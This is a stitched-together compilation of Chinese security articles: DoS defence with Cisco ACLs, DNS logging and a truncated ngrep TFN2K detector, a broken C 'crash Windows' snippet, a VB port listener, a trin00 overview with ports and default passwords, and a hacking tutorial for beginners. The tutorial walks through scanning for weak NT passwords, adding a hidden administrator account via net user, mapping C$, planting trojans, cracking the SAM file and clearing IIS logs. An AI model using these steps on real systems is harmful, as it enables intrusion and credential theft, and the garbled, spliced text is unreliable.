? 软件弱点是包含在操作系统或应用程序中与安全相关的系统缺陷，这些缺陷大多是由于错误的程序编制，粗心的源代码审核，无心的副效应或一些不适当的绑定所造成的。根据错误信息所带来的对系统无限制或者未经许可的访问程度，这些漏洞可以被分为不同的等级。 
? 典型的拒绝服务攻击有如下两种形式：资源耗尽和资源过载。当一个对资源的合理请求大大超过资源的支付能力时就会造成拒绝服务攻击（例如，对已经满载的Web服务器进行过多的请求。）拒绝服务攻击还有可能是由于软件的弱点或者对程序的错误配置造成的。区分恶意的拒绝服务攻击和非恶意的服务超载依赖于请求发起者对资源的请求是否过份，从而使得其他的用户无法享用该服务资源。 
? 错误配置也会成为系统的安全隐患。这些错误配置通常发生在硬件装置，系统或者应用程序中。如果对网络中的路由器，防火墙，交换机以及其他网络连接设备都进行正确的配置会减小这些错误发生的可能性。如果发现了这种漏洞应当请教专业的技术人员来修理这些问题。 
如果换个角度，也可以说是如下原因造成的： 
? 错误配置。错误配置大多是由于一些没经验的，无责任员工或者错误的理论所导致的。开发商一般会通过对您进行简单的询问来提取一些主要的配置信息，然后在由经过专业培训并相当内行的专业人士来解决问题。 
? 软件弱点。由于使用的软件几乎完全依赖于开发商，所以对于由软件引起的漏洞只能依靠打补丁，安装hot fixes和Service packs来弥补。当某个应用程序被发现有漏洞存在，开发商会立即发布一个更新的版本来修正这个漏洞。 
? 拒绝服务攻击。拒绝服务攻击大多是由于错误配置或者软件弱点导致的。某些DoS攻击是由于开发协议固有的缺陷导致的，某些DoS攻击可以通过简单的补丁来解决，还有一些导致攻击的系统缺陷很难被弥补。最后，还有一些非恶意的拒绝服务攻击的情况，这些情况一般是由于带宽或者资源过载产生瓶颈导致的，对于这种问题没有一个固定的解决方案。 
深入DoS 
DoS的攻击方式有很多种。最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，致使服务超载，无法响应其他的请求。这些服务资源包括网络带宽，文件系统空间容量，开放的进程或者向内的连接。这种攻击会导致资源的匮乏，无论计算机的处理速度多么快，内存容量多么大，互连网的速度多么快都无法避免这种攻击带来的后果。因为任何事都有一个极限，所以，总能找到一个方法使请求的值大于该极限值，因此就会使所提供的服务资源匮乏，象是无法满足需求。千万不要自认为自己拥有了足够宽的带宽就会有一个高效率的网站，拒绝服务攻击会使所有的资源变得非常渺小。 
传统上，攻击者所面临的主要问题是网络带宽，由较小的网络规模和较慢的网络速度，无法使攻击者发出过多的请求，然而，类似"the ping of death"的攻击类型紧需要很少量的包就可以摧毁一个没有打过补丁的UNIX系统。当然，多数的DoS攻击还是需要相当大的带宽的，但是高带宽是大公司所拥有的，而以个人为主的黑客很难享用。为了克服这个缺点，恶意的攻击者开发了分布式的攻击。这样，攻击者就可以利用工具集合许多的网络带宽来对同一个目标发送大量的请求。 
以下的两种情况最容易导致拒绝服务攻击： 
? 由于程序员对程序错误的编制，导致系统不停的建立进程，最终耗尽资源，只能重新启动机器。不同的系统平台都会采取某些方法可以防止一些特殊的用户来占用过多的系统资源，我们也建议尽量采用资源管理的方式来减轻这种安全威胁。 
? 还有一种情况是由磁盘存储空间引起的。假如一个用户有权利存储大量的文件的话，他就有可能只为系统留下很小的空间用来存储日志文件等系统信息。这是一种不良的操作习惯，会给系统带来隐患。这种情况下应该对系统配额作出考虑。 
从安全的角度来看，本地的拒绝服务攻击可以比较容易的追踪并消除。而我们这篇文章主要是针对于网络环境下的DoS攻击。下面我们大体讨论一下较为常见的基于网络的拒绝服务攻击： 
? Smurf (directed broadcast)。广播信息可以通过一定的手段（通过广播地址或其他机制）发送到整个网络中的机器。当某台机器使用广播地址发送一个ICMP echo请求包时（例如PING），一些系统会回应一个ICMP echo回应包，也就是说，发送一个包会收到许多的响应包。Smurf攻击就是使用这个原理来进行的，当然，它还需要一个假冒的源地址。也就是说在网络中发送源地址为要攻击主机的地址，目的地址为广播地址的包，会使许多的系统响应发送大量的信息给被攻击主机（因为他的地址被攻击者假冒了）。使用网络发送一个包而引出大量回应的方式也被叫做"放大器"，这些smurf放大器可以在www.netscan.org网站上获得，一些无能的且不负责任的网站仍有很多的这种漏洞。 
? SYN flooding 一台机器在网络中通讯时首先需要建立TCP握手，标准的TCP握手需要三次包交换来建立。一台服务器一旦接收到客户机的SYN包后必须回应一个SYN/ACK包，然后等待该客户机回应给它一个ACK包来确认，才真正建立连接。然而，如果只发送初始化的SYN包，而不发送确认服务器的ACK包会导致服务器一直等待ACK包。由于服务器在有限的时间内只能响应有限数量的连接，这就会导致服务器一直等待回应而无法响应其他机器进行的连接请求。 
? Slashdot effect 这种攻击手法使web服务器或其他类型的服务器由于大量的网络传输而过载，一般这些网络流量是针对某一个页面或一个链接而产生的。当然这种现象也会在访问量较大的网站上正常发生，但我们一定要把这些正常现象和拒绝服务攻击区分开来。如果您的服务器突然变得拥挤不堪，甚至无法响应再多的请求时，您应当仔细检查一下这个资源匮乏的现象，确认在10000次点击里全都是合法用户进行的，还是由5000个合法用户和一个点击了5000次的攻击者进行的。 
拒绝服务一般都是由过载导致的，而过载一般是因为请求到达了极限。 
拒绝服务攻击的发展 
由于我们防范手段的加强，拒绝服务攻击手法也在不断的发展。 
Tribe Flood Network (tfn) 和tfn2k引入了一个新概念：分布式。这些程序可以使得分散在互连网各处的机器共同完成对一台主机攻击的操作，从而使主机看起来好象是遭到了不同位置的许多主机的攻击。这些分散的机器由几台主控制机操作进行多种类型的攻击，如UDP flood, SYN flood等。 
操作系统和网络设备的缺陷在不断地被发现并被黑客所利用来进行恶意的攻击。如果我们清楚的认识到了这一点，我们应当使用下面的两步来尽量阻止网络攻击保护我们的网络： 
A）尽可能的修正已经发现的问题和系统漏洞。 
B）识别，跟踪或禁止这些令人讨厌的机器或网络对我们的访问。 
我们先来讨论一下B），在B）中我们面临的主要问题是如何识别那些恶意攻击的主机，特别是使用拒绝服务攻击的机器。因为这些机器隐藏了他们自己的地址，而冒用被攻击者的地址。攻击者使用了数以千记的恶意伪造包来使我们的主机受到攻击。"tfn2k"的原理就象上面讲的这么简单，而他只不过又提供了一个形象的界面。假如您遭到了分布式的拒绝服务攻击，实在是很难处理。 
解决此类问题的一些专业手段----包过滤及其他的路由设置 
有一些简单的手法来防止拒绝服务式的攻击。最为常用的一种当然是时刻关注安全信息以期待最好的方法出现。管理员应当订阅安全信息报告，实时的关注所有安全问题的发展。：） 
第二步是应用包过滤的技术，主要是过滤对外开放的端口。这些手段主要是防止假冒地址的攻击，使得外部机器无法假冒内部机器的地址来对内部机器发动攻击。 
我们可以使用Cisco IOS来检查路由器的详细设置，当然，它也不仅限于Cisco的设备，但由于现在Cisco设备在网络中占有了越来越多的市场份额（83%），所以我们还是以它为例子，假如还有人有其他的例子，我们也非常高兴你能提出您的宝贵信息。 
登陆到将要配置的路由器上，在配置访问控制列表之前先初始化一遍： 
c3600(config)#access-list 100 permit ip 207.22.212.0 0.0.0.255 any 
c3600(config)#access-list 100 deny ip any any 
然后我们假设在路由器的S0口上进行ACL的设置，我们进入S0口，并进入配置状态： 
c3600(config)#int ser 0 
c3600(config-if)#ip access-group 100 out 
通过显示access-list来确认访问权限已经生效： 
c3600#sho access-lists 100 
Extended IP access list 100 
permit ip 207.22.212.0 0.0.0.255 any (5 matches) 
deny ip any any (25202 matches) 
对于应该使用向内的包过滤还是使用向外的包过滤一直存在着争论。RFC 2267建议在全球范围的互连网上使用向内过滤的机制，但是这样会带来很多的麻烦，在中等级别的路由器上使用访问控制列表不会带来太大的麻烦，但是已经满载的骨干路由器上会受到明显的威胁。 
另一方面，ISP如果使用向外的包过滤措施会把过载的流量转移到一些不太忙的设备上。 ISP也不关心消费者是否在他们的边界路由器上使用这种技术。当然，这种过滤技术也并不是万无一失的，这依赖于管理人员采用的过滤机制。 
我们经常会听到设备销售或集成商这样的推脱之词，他们总是说使用ACL会导致路由器和网络性能的下降。ACL确实会降低路由器的性能并加重CPU的负载，但这是微乎其微的。我们曾经在Cisco 2600 和3600系列路由器上作过实验： 
以下是不使用和使用ACL时的对照表： 
Test Speed w/o ACL (Mbps) w/ ACL (Mbps) w/o ACL (total time) w/ ACL (total time) % change 
Cisco 2600 100Mbps -》 100 Mbps File transfers 36.17 Mbps 35.46 Mbps 88.5 90.2 2.50% 
Cisco 3600 10Mbps -》 10Mbps File transfers 7.95 Mbps 8.0Mbps 397 395 0.30% 
使用的路由器配置如下： 
? Cisco 3640 (64MB RAM, R4700 processor, IOS v12.0.5T) 
? Cisco 2600 (128MB RAM, MPC860 processor, IOS v12.0.5T) 
由表我们可以看出，在使用ACL前后对路由器性能的影响并不是很大。 
使用DNS来跟踪匿名攻击 
也许大家仍旧保存着侥幸心理，认为这些互连网上给我们带来无数麻烦DoS漏洞或许随着路由器包过滤，网络协议升级到IPv6或者随时的远程响应等手段变得越来越不重要。但从一个具有责任感的网管的观点来看，我们的目标并不是仅仅阻止拒绝服务攻击，而是要追究到攻击的发起原因及操作者。 
当网络中有人使用假冒了源地址的工具（如tfn2k）时，我们虽然没有现成的工具来确认它的合法性，但我们可以通过使用DNS来对其进行分析： 
假如攻击者选定了目标www.technotronic.com，他必须首先发送一个DNS请求来解析这个域名，通常那些攻击工具工具会自己执行这一步，调用gethostbyname()函数或者相应的应用程序接口，也就是说，在攻击事件发生前的DNS请求会提供给我们一个相关列表，我们可以利用它来定位攻击者。 
使用现成工具或者手工读取DNS请求日志，来读取DNS可疑的请求列表都是切实可行的，然而，它有三个主要的缺点： 
l 攻击者一般会以本地的DNS为出发点来对地址进行解析查询，因此我们查到的DNS请求的发起者有可能不是攻击者本身，而是他所请求的本地DNS服务器。尽管这样，如果攻击者隐藏在一个拥有本地DNS的组织内，我们就可以把该组织作为查询的起点。 
l 攻击者有可能已经知道攻击目标的IP地址，或者通过其他手段（host, ping）知道了目标的IP地址，亦或是攻击者在查询到IP地址后很长一段时间才开始攻击，这样我们就无法从DNS请求的时间段上来判断攻击者（或他们的本地服务器）。 
l DNS对不同的域名都有一个却省的存活时间，因此攻击者可以使用存储在DNS缓存中的信息来解析域名。为了更好做出详细的解析记录，您可以把DNS却省的TTL时间缩小，但这样会导致DNS更多的去查询所以会加重网络带宽的使用。 
在许多情况下，只要您拥有足够的磁盘空间，记录所有的DNS请求并不是一种有害的做法。在BIND8.2中做记录的话，可以在named.conf中假如下面的几行： 
logging { 
channel requestlog { file "dns.log"; }; 
category queries { requestlog; }; 
}; 
使用 ngrep来处理tfn2k 攻击 
根据使用DNS来跟踪tfn2k驻留程序的原理，现在已经出现了称为ngrep的实用工具。经过修改的ngrep（参见附录）可以监听大约五种类型的tfn2k拒绝服务攻击(targa3, SYN flood, UDP flood, ICMP flood 和 smurf)，它还有一个循环使用的缓存用来记录DNS和ICMP请求。如果ngrep发觉有攻击行为的话，它会将其缓存中的内容打印出来并继续记录ICMP回应请求。假如攻击者通过ping目标主机的手段来铆定攻击目标的话，在攻击过程中或之后记录ICMP的回应请求是一种捕获粗心的攻击者的方法。由于攻击者还很可能使用其他的服务来核实其攻击的效果（例如web），所以对其他的标准服务也应当有尽量详细的日志记录。 
还应当注意，ngrep采用的是监听网络的手段，因此，ngrep无法在交换式的环境中使用。但是经过修改的ngrep可以不必和你的DNS在同一个网段中，但是他必须位于一个可以监听到所有DNS请求的位置。经过修改的ngrep也不关心目标地址，您可以把它放置在DMZ网段，使它能够检查横贯该网络的tfn2k攻击。从理论上讲，它也可以很好的检测出对外的tfn2k攻击。 
运行 ngrep, 您将看到： 
[root@lughnasad ngrep]# ./ngrep 
Ngrep with TFN detection modifications by wiretrip / www.wiretrip.net 
Watching DNS server: 10.0.0.8 
interface: eth0 (10.0.0.0/255.255.0.0) 
从这里开始ngrep将监听tfn2k攻击，如果检测到攻击, ngrep将在屏幕上打印： 
Sun Jan 9 17:30:01 2000 
A TFN2K UDP attack has been detected! 
Last (5000) DNS requests: 
《list of IPs that made DNS requests, up to DNS_REQUEST_MAX length》 
Last (1000) ICMP echo requests (pings): 
《list of IPs that made ICMP echo requests, up to ICMP_REQUEST_MAX length》 
Incoming realtime ICMP echo requests (pings): 
《all ICMP echo requests since the attack was detected》 
以上的列表并不是唯一的，可以对它进行调整让他不仅显示是谁请求，而且请求多少次，频率为多少等等。在ICMP flood事件中，ICMP回应请求的报告中将不包括做为tfn2k flood一部分的ICMP包。Ngrep还可以报告检测出来的除smurf之外的攻击类型（TARGA, UDP, SYN, ICMP等）。混合式的攻击在缺省情况下表现为ICMP攻击，除非你屏蔽了向内的ICMP回应请求，这样它就表现为UDP或SYN攻击。这些攻击的结果都是基本类似的。 
附录- Ngrep.c with tfn2k detection 
以下的代码在使用前应当更改一些参数。 
#define DNS_REQUEST_MAX 5000 
#define ICMP_REQUEST_MAX 1000 
通知ngrep最大的请求跟踪数（在检测攻击之前）。传输较为繁忙的网站应当增加这一数值（网络流量较为繁忙的网站DNS的请求数最好在10，000，而ICMP请求为2000-3000） 
#define FLOOD_THRESHOLD 20 
用在10秒中内有多少同一类型的攻击包来确认为真正的攻击。数目设计的越大，程序报受攻击的可能性就越小。假如您老是收到错误的警报，那么您应当增加一下这个数值。 
#define DNS_SERVER_IP "10.0.0.8" 
Ngrep通过监视DNS服务器的53端口的UDP包来跟踪向内的DNS请求（只有UDP）。因此，ngrep需要知道您的DNS服务器的IP地址。 
我们的设备可能会有多个DNS服务器，但我们认为对一台DNS服务器的支持足以证明这项技术的能力。 
#define TTL_THRESHOLD 150 
tfn2k SYN flood 攻击使用的 TTL值通常在200-255的范围内。估计到攻击者与目标主机之间不止50跳，因此我们可以只查找TTL时间高于150的包。假如您相信攻击者在50跳左右，那么您可以对TTL的限制进行一下更改。 
编译更改过的 ngrep 
编译和安装都非常简单。您仅需要使用以下之一来取代ngrep.c 文件。处于方便起见，我们可以详细说明。 
这段代码只是在RedHat 6.1 和Mandrake 6.5 Linux上测试过。 
首先您需要在 http://www.packetfactory.net/ngrep/ 下载ngrep，我们测试的是1.35版。 
然后在 ftp://ftp.ee.lbl.gov/libpcap.tar.Z下载libpcap 我们使用的是 0.40版。 
把文件放在临时文件夹里并解包， 
tar xvzf libpcap.tar.Z 
然后进行编译 
cd libpcap-0.4; ./configure; make; make install; make install-incl 
假如您遇到了困难，可以参见在libpcap-0.4目录里的README或INSTALL文件。根据我们实验的经验，如果/usr/local/include 和/usr/local/include/net目录在linux系统中不存在的话，安装会失败。加入您在安装时遇到了pcap.h 或 bpf.h的错误时你可以运行 
mkdir /usr/local/include; mkdir /usr/local/include/net然后重新运行'make install-incl'。然后我们需要编译ngrep (使用我们修改过的版本)。首先解包 
tar xvzf ngrep-1.35.tar.gz 
然后进行配置 
cd ngrep; ./configure 
然后把ngrep.c复制到ngrep目录里。你可以覆盖也可以备份原始的ngrep.c文件。在这里，您应当回顾在修改过的ngrep.c里的配置，至少您应当把DNS_SERVER_IP更改为您所使用的DNS的地址。更改完毕后你就可以运行'make'，这样就建立了ngrep应用程序。 
Modified ngrep.c source code 
/* this code is available for download from http://www.wiretrip.net/na/ngrep.c */ 
/* 
* $Id: ngrep.c,v 1.35 1999/10/13 16:44:16 jpr5 Exp $ 
* 
*/ 
/* TFN detection code added by Rain Forest Puppy / rfp@wiretrip.net 
and Night Axis / na@wiretrip.net */ 
/********* TFN detection defines *******************************/ 
/* how many DNS and ICMP requests to track */ 
#define DNS_REQUEST_MAX 5000 
#define ICMP_REQUEST_MAX 1000 
/* flood threshold is matches per 10 seconds */ 
#define FLOOD_THRESHOLD 20 
/* IP of your DNS server */ 
#define DNS_SERVER_IP "10.9.100.8" 
/* TFN syn uses ttl between 200-255. Assuming less than 50 hops, 
flag stuff with ttl > TTL_THRESHOLD (other critera are used 
as well) */ 
#define TTL_THRESHOLD 150 
/**************************************************************/ 
#include <stdlib.h> 
#include <string.h> 
#include <signal.h> 
#ifdef LINUX 
#include <getopt.h> 
#endif 
#if defined(BSD)  
如何用9行代码干掉Windows XP,2000
 微软一直声称Windows XP多么多么稳定可靠，但日前一位名为Masaru Tsuchiyama（留在程序下方，所以应该是他的昵称）外国编程爱好者刊出了一小段C语言代码。这一只有9行的小程序如果在Windows XP/2000下运行，则可导致系统完全崩溃，并重新启动。但此程序对其他版本的Windows没有任何影响。这一产生无限循环输出的小程序的代码如下：
　　#include 
　　int main( void ) 
　　{ 
　　for(;;){ 
　　printf( "hung up\t\t\b\b\b\b\b\b" ); 
　　print("hung up\t\t\b\b\b\b\b\b"); 
　　} 
　　return 0; 
　　} 
如果去掉Print语句，此程序还会导致NT 4.0系统出现蓝屏错误。 
用VB编写入侵监听程序 
　
  上网的时候很容易遭到探测，一般探测你个人的入侵者技术不会高明到哪里去。所以根本不能称上黑客，所以本文就用入侵者来代替。他们对普通网民的扫描可以是多端口单IP的扫描或者多IP单端口扫描。前者是通过一些IP工具来取得你的IP，然后尝试利用端口扫描获取你的信息，看你的计算机有没有预先中了木马。然后通过网上的木马端口列表，来获得木马名称。用相应的客户端软件来连接到你的计算机。从而获得密码、以及你的秘密信息。后者则是通过利用如SuperScan等可以大范围扫描IP的软件，扫描打开特定端口的机器。比如，可以扫描打开7626端口的机器，看对方是否中了冰河。然后，入侵者就用客户端连接到服务器从而入侵你的计算机。
这些扫描是简单的TCP的Connect扫描。所以无法避开防火墙的追踪。网民就可以利用天网等防火墙软件来获取对方的IP。相信很多DIY迷或者编程爱好者总是想拥有属于自己的类似的工具。本文就给你讲述如何用VB来获得探测你的入侵者的IP地址，然后……我可没有教你用蓝屏炸弹或者蜗牛炸弹去炸它哦。毕竟，我们没有入侵者的野心，本程序还可以让你监听80端口，来察看对方对你进行的常规扫描。要看懂本文，你需要有一定的VB基础。
好了，废话少说，我们来看看本程序的基本原理：
入侵者通过Connect本机的端口，然后通过是否成功，来获得信息。由于TCP的三次握手原理。他必定会留下自己的IP，我们就利用这一个原理来获得对方的IP。
Winsock控件的属性、方法和事件在我上次写的《.用winsock制作漏洞扫描器》一文中已经叙述过，这里就不再介绍。大家还一定记得RemoteHostIP和LocalPort属性吧。这就是对方的IP和自己的端口。聪明的你应该明白了吧。通过这两个属性就可以清楚的获得对方的IP地址和他正在扫描的本地端口。
因为不可能一个端口只有一个人会扫描，所以本程序我们需要使用到控件数组。这个概念的描述大家可以查找MSDN。本程序的流程是：
１、 定义需要监听的端口
２、 装载一定数量的Winsock1控件，从需要监听的端口列表中获得数据。一一开启监听功能。（Listen）
３、 当某一个控件接收到连接的事件发生，就把得到的RemoteIP和LocalPort加入日志
４、 加载一个Winsock2，继续捕获数据（Getdata）
５、 Winsock2数据到达记录数据
程序的基本概念都介绍完了，相信你对本程序已经有了一定的认识。现在我们就来开始我们的工作：
程序的控件以及说明如下：
控件名 控件类型 属性
Label1 Label Caption=”增加端口”
Command1 command Caption=”添加”
Command2 command Caption=”监听”
Command3 Command Caption=”退出”
Listports Listbox 无
TxtLog Richtextbox 无
程序的界面如图： 
程序的代码以及说明如下：
‘本程序在VB6.0＋Windows2000下测试通过！
Dim tmpstr As String
Dim NOW_OUT As Integer '总共出去连接的有几个Winsock
Private Sub Command1_Click()
ListPorts.AddItem txtADDPORT.Text
End Sub 
Private Sub Command2_Click()
On Error Resume Next
If Command2.Caption = "监听" Then
For i = 0 To ListPorts.ListCount - 1
Load Winsock1(i + 1) '加载监听端口的winsock1数组控件
Winsock1(i + 1).LocalPort = ListPorts.List(i) '设定端口
Winsock1(i + 1).Listen '监听
Next i
Command2.Caption = "停止"
Else
For i = 1 To Winsock1.Count - 1
Unload Winsock1(i)
Next i
For i2 = 1 To Winsock2.Count - 1
Unload Winsock2(i2)
Next i2
Command2.Caption = "监听"
End If
End Sub 
Private Sub Command3_Click()
Unload Me
End Sub 
Private Sub form_Load()
txtLOG.Text = "日志:" & vbCrLf
NOW_OUT = 1
End Sub 
Private Sub Winsock1_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Load Winsock2(NOW_OUT) '加载建立连接的Winsock2数组控件
Winsock2(NOW_OUT).Accept requestID '建立连接
Winsock1(Index).Close
Winsock1(Index).Listen 'Winsock1继续监听
NOW_OUT = NOW_OUT + 1 '连接的控件累加
myAddLog "来自" & Winsock1(Index).RemoteHostIP & "连接到本地端口:" & Winsock1(Index).LocalPort
'显示捕获的连接
End Sub 
Private Sub Winsock2_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Winsock2(Index).GetData tmpstr '通过Getdata捕获数据
myAddLog "来自" & Winsock2(Index).RemoteHostIP & "的数据：" & tmpstr '显示捕获的数据
End Sub 
Sub myAddLog(tmptext As String) '加入日志
tmptext = tmptext & vbCrLf
txtLOG.SelStart = Len(txtLOG.Text)
txtLOG.SelText = tmptext
End Sub 
总结：其实一些程序的原理很简单，我们只要善于实践，并且能够把所学的只是运用到你的程序中去，我想编出类似的程序是很简单的。如木马、端口扫描器、客户端工具、CGI漏洞扫描器……。VB的Winsock控件虽说不是底层操作。及不上C语言的Socket编程的功能。但实现普通的操作还是很有用的。简单的例子就是Cookie欺骗，用VB来编写这种程序十分简单。好了，不多说了，希望你多光临我们的安全站点：http://www.seceye.com  
最新D’O’S攻击方式
 很遗憾，在99年7月份，微软视窗操作系统的又一个Bug被黑客们发现，并且黑客们已利用此漏洞成功进行了多次攻击。这种新的攻击方式被称为分布式拒绝服务(Distributed Denial Of Service)攻击，简称D’O’S攻击。据称国外一些高性能的商业网络和教育网络都遭受到了这种攻击。
　　D’O’S攻击是拒绝服务攻击的一种特殊形式。
一、D’O’S攻击方式的原理及实现
　　这种攻击的基本原理，是利用攻击者已经侵入并控制的主机（可能是数百台），对某一单机发起攻击。在悬殊的带宽力量对比下，被攻击的主机会很快失去反应。
　　这种攻击方式被证实是非常有效的，而且非常难以抵挡。但这种攻击方式的实现有一定的难度，一般的人比较难以顺利实施，因为攻击者必须熟悉一些入侵技巧。但是令人不安的是，已经有帮助实现这种攻击的工具被黑客们编写出来了，已知的两个是trin00和TribeFloodNetwork，源代码包的安装使用过程是比较复杂的，因为编译者首先要找一些internet上有漏洞的主机，通过一些典型而有效的远程溢出漏洞攻击程序，获取其系统控制权，然后在这些机器上装上并运行分布端的攻击守护进程。
二、用工具软件实现D’O’S攻击
　　了解这种新出现的攻击方式，对于我们防范此类攻击是非常有用的，下面就简单地介绍一下trin00的结构以及采用这种工具实现D’O’S攻击的大致方法。
　　trin00由三部分组成：
1、客户端
　　客户端可以是telnet之类的常用连接软件，客户端的作用是向主控端(master)发送命令。它通过连接master的27665端口，然后向master发送对目标主机的攻击请求。
2、主控端(master)
　　主控端侦听两个端口，其中27655是接收攻击命令，这个会话是需要密码的。缺省的密码是“betaalmostdone”。master启动的时候还会显示一个提示符：“??”，等待输入密码。密码为“gOrave”，另一个端口是31335，等候分布端的UDP报文。
3、分布端(broadcast)——攻击守护进程
　　分布端则是执行攻击的角色。分布端安装在攻击者已经控制的机器上，分布端编译前植入了主控端的IP地址，分布端与主控端用UDP报文通信，发送到主控端的31355端口，其中包含"*HELLO*"的字节数据。主控端把目标主机的信息通过27444UDP端口发送给分布端，分布端即发起“潮水”（flood）攻击。 
　　攻击的流向是这样的：“攻击者-->master-->分布端-->目标主机”。
　　从分布端向受害者目标主机发送的D.O.S都是UDP报文，每一个包含4个空字节，这些报文都从一个端口发出，但随机地袭击目标主机上的不同端口。目标主机对每一个报文回复一个ICMP Port Unreachable的信息，大量不同主机发来的这些洪水般的报文源源不断，目标主机将很快慢下来，直至剩余带宽变为0。
三、应付D’O’S攻击的策略
　　有几种方式可以查到这种攻击，但由于这种攻击的主要目的是消耗主机的带宽，所以很难抵挡。必须开发一些动态的IDS产品，才有助于对付这种攻击。IDS的检测方法是：分析一系列的UDP报文，寻找那些针对不同目标端口，但来自于相同源端口的UDP报文。或者取10个左右的UDP报文，分析那些来自于相同的IP，相同的目标IP，相同的源端口，但不同的目标端口的报文。这样可以逐一识别攻击的来源。还有一种方法是寻找那些相同的源地址和相同的目标地址的ICMP Port Unreachable的信息。
入门者如何获取肉鸡（跳板）
今天我们来讲一讲一些简单的入侵，这篇文章是送给新手的，难的文章我也写不出来~~ 这里讲的方法都是针对winnt和2000的，平台是2000。我只是想送给新手点肉鸡罢了。 
罗嗦了这么多，现在我们开始吧~。首先我们来对几个扫描器评点一下什么？你不知道扫描器是什么？我晕~~~扫描器就是扫描的嘛，它可以检测出主机的漏洞！ 
常见的有端口扫描器，和cgi漏洞扫描器，还有就是象流光那样的大型扫描器，什么都可以扫。我们先来讲一下扫描器的原理！ 
现在假设你是A，要扫的是B 
那么，通常建立3次握手的过程是 
A--------Syn------->B 
A<-----Syn/Ack------B 
A-------Ack-------->B 
这样就建立了连接,扫描就是建立很多这样的,从而达到了解对方开了哪些端口,哪些服务厉害的扫描器还会进一步探测!但是,这种tcp扫描会留下大量的记录,如果B的网管不是白痴那么他就会开始注意你了!! 
所以我们又会用半开放式扫描(syn) 
也就是 
A--------Syn------->B 
A<-----Syn/Ack------B 
A------->\\ B 
A-connected--?<-----B 
这样,由于B一直得不到确认,当然就不会记录ip啦,不过B若是很bt,那么他也会记录任何syn的 ip,那就没办法了!! 
扫描的原理讲完了,现在来讲讲几个扫描的工具!!这才是重点,新手哪会关心
那原理啊~~~ 我们先来讲端口扫描器一个端口就是一条路,进入系统的的路!可见他的重要!! 
我推荐用superscan和nscan两个都是国外的,superscan的汉化版有问题,建议去www,peckerland.com下载E文版 
nscan在黑白有下! 这两个的界面简单,我就不罗嗦了!我很喜欢superscan.他的扫描准且快~~对单一端口的大规模扫描也很不错,以前大家就是用它来扫3389的! 
下面我来介绍流光!!xscan!!和sss!!! 我想大家对流光应该不陌生吧!如果你是新手,先从流光开始!!界面很cool!多亏榕哥~~不过我宁可把流光作为一个攻击的工具而不是扫描的工具xscan则是安全焦点的,他可以半开放式扫描!! 
而且在扫描上我觉得比流光好!因为我问过sharkstorm,他说流光会在对方主机上留下痕迹,所以我怀疑流光用的是tcp扫描! 所以我现在用大规模扫描时是用xscan而不是流光! 接下来是sss,现在的最新版是3.43,在www.peckerland.com上有3.41版和注册机. 
他是由redshadow开发的,全称shadow security scanner他能扫描很多漏洞,速度也很快,留下的痕迹少,产生报告详细.有时候流光或是国内一些扫描器会误报,这时我常用他来检测.所以,在入侵单一机器时,我用的就是它!!!! 
好累啊,先喝口茶~~~下面就讲怎样获得大量肉鸡! 这里我推荐用扫描nt弱口令的方法! 当然也许别人会推荐扫描sql的弱口令,但网上的nt弱口令真的比sa为空的要多太多了~~ 我们先打开流光4->扫描->简单扫描->nt/98->IP段开始扫,扫到很多139开了的主机然后ipc主机,右键->探测->远程探测用户然后就会有很多用户和共享被扫出来,其中有可能包括弱口令(参见杀手的流光教程)这里我告诉大家一个秘诀,就是有很多是guest为admin权限的,这些的密码一般为空这是因为这台主机被攻破过,有人留下了后门,这下便宜我们了,先拿来用了再说! 
前面我们说过,我不喜欢用流光来扫描,所以,我们在这里用xscan来扫描nt弱口令! 在扫描选项里选nt弱口令,然后来个ip范围,让他扫,接下来就可以等待战果了一般会很丰硕,我每次扫这个都很爽!!! 接下来就要讲怎么用了!前面提到过我喜欢用流光来攻击,现在就让我们看看他的强大!! 流光4->工具->nt/iis工具->nt远程管道命令输入ip,刚才扫到的用户名,密码(若为空则不填) 连接! 
ntcmd>net user 
看看,连上了吧~~ 
我们来添加一个用户名 
ntcmd>net user aaa 123 /add 
命令成功完成 
加到administrators组 
ntcmd>net localgroup administrators aaa /add 
命令成功完成 
好了,这样肉鸡就做好了.什么?你想把他作成跳板? 好的,我们继续来 
流光4->工具->nt/iis工具->ipc种植者 
添上ip,用户名,密码等 
然后点开始 
接下来我们再用telnet连上去,去debug snake的sksockserver注意，用ntcmd
不能安装sksockserver。 
具体我就不说了,大家自己参考说明. 
当然,大家也可以放一堆后门上去. 
不过我喜欢这样 
ntcmd>net use g: \\ip\c$ 
命令成功完成 
这样,我们就把他的c盘映射成了我的g盘。然后我再放个木马的server上去再用ntcmd运行,呵呵搞定~~,玩他没商量!!! 
我们还可以把c;\winnt\repair\sam._抓下来,用lc3跑一下 就得到所有用户的密码,或是用木马抓密码!! 
当然我们也可以telnet上去运行tlntadmn来修改telnet端口，更隐蔽怎么扩大战果呢?我们仍用ntcmd 
ntcmd>net view 
...... 
出来很多机器名,这是和我们的肉鸡共享的 
比如有一台是 
\\LOVE 
我们就 
ntcmd>ping -a LOVE 
这样就得到了他的ip 
我一般会用sss再扫一次 
当然,你也可以用你得到的密码去试试,看能不能进去,呵呵 
有一次,我"不小心"跑到某教育部门,net view一下,居然和教育局挂钩....接下来出于自身安全,我就停住了,呵呵,中国的政府不能乱搞的~~~ 
最后是打扫脚印,建议用小榕的cleaniislog,很方便,用法参见说明! 请记住,入侵nt的首选绝对是139,netbios 
补充一点,大家在连接时可以用2000自带的计算机管理->连接到计算机这样也很方便. 
关于其他几种方法，我在这里说明一下
输入法基本上绝种了~~ 不过如果你扫大量的肉鸡也许还有最好用的应该数sql的sa为空，直接用流光连就行了，连上后就可以直接添加帐号等，但是有一点不好有时候会连不上。比如我在学校机房就从来没连上过，估计是我在内部网络，有硬防火墙的原因，我在3389上就连的很好。不过总是玩这个是不会提高的！其次要说明的就是idq溢出与.printer的漏洞，这两个漏洞我不想多说什么，因为很多人都会用但成功不了，我在这里就说说什么情况下可以成功。一般来说，用xscan扫描，如果出现说isapi扩展，那么恭喜你，如果存在这两个漏洞绝对成功，我屡试不爽。因为这两个漏洞都与iis那个破东西息息相关，所以大家不要被别的扫描器的误报迷惑，在安焦的漏洞库有这两个漏洞的详细说明。
关于unicode漏洞请参见ncc写的教程
流光是一个很好的攻击工具,他的exploits文件夹和tools文件夹的东西大家漫漫体会,呵呵。不说了,不然天下大乱了!! 
